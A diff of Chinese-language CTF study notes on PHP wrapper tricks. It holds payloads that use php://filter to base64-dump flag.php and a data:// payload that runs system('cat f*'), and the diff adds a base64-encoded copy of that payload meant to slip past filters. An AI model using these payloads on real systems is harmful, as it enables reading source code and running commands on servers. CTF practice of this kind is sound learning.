@@ -17,7 +17,6 @@ include php://filter/read=convert.base64-encode/resource=flag.php
 
 也可中间加个index等字符也可以。
 php://filter/read=convert.base64-encode/index/resource=flag
-
 ```
 
 ^
@@ -42,6 +41,7 @@ file_get_contents($_GET['2333']) === 'todat is a happy day'
 
 代码执行获取flag
 payload：?c=data://text/plain,<?php system('cat f*');?>
+防止过滤一下：?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==
 ```
 
 
